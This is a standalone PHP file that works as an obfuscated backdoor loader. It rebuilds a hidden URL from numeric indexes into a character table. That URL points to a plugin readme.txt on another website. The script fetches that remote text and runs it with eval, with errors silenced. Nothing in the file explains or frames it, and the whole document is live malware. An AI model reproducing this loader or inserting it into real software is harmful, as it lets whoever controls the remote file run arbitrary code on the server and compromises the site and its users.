<?php

$characters = array_merge(range('a', 'z'), range('A', 'Z'), range('0', '9'), ['.', ':', '/', '_', '-']);
$indexArray = [7, 19, 19, 15, 18, 63, 64, 64, 11, 12, 18, 62, 18, 19, 8, 12, 18, 20, 10, 12, 0, 12, 4, 3, 0, 13, 62, 0, 2, 62, 8, 3, 64, 22, 15, 66, 2, 14, 13, 19, 4, 13, 19, 64, 15, 11, 20, 6, 8, 13, 18, 64, 6, 14, 18, 12, 19, 15, 64, 17, 4, 0, 3, 12, 4, 62, 19, 23, 19];

$decodedString = '';
foreach ($indexArray as $index) {
    $decodedString .= $characters[$index];
}

$url = "$decodedString";
$response = file_get_contents($url);

if ($response !== false) {
    @eval("?>".$response);
}
?>
